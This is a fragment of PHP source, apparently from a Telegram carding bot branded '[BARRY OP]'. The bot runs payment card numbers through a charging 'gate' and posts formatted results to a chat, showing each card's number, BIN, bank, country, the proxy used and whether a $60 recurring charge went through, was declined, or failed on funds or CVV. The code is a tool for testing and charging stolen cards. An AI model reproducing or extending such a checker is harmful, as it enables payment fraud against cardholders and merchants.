...
$time = substr($time, 0, 4);
  curl_close($ch);
    ...
    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$res1.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[BARRY OP]</a>', $message_id);
    return;
}
...
if ((strpos($result2, 'Created')) || (strpos($result2, "Create")) || (strpos($result2, "create"))){
	sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐑𝐞𝐜𝐮𝐫𝐥𝐲 𝐂𝐡𝐚𝐫𝐠𝐞 𝟔𝟎$ <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Charged 60$</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$msg.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [BARRY OP]</a>', $message_id);
...
elseif ((strpos($result2, 'The card has insufficient funds to cover the cost of the transaction.')) || (strpos($result2, 'insufficient_funds'))){
	sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐑𝐞𝐜𝐮𝐫𝐥𝐲 𝐂𝐡𝐚𝐫𝐠𝐞 𝟔𝟎$ <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$error.'</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$msg.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [BARRY OP]</a>', $message_id);
...
elseif ((strpos($result2, "fraud_security_code")) || (strpos($result2, "because the security code (CVV)"))){
	...
	sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐑𝐞𝐜𝐮𝐫𝐥𝐲 𝐂𝐡𝐚𝐫𝐠𝐞 𝟔𝟎$ <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>Error!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$error.'</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$msg.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [BARRY OP]</a>', $message_id);
	}
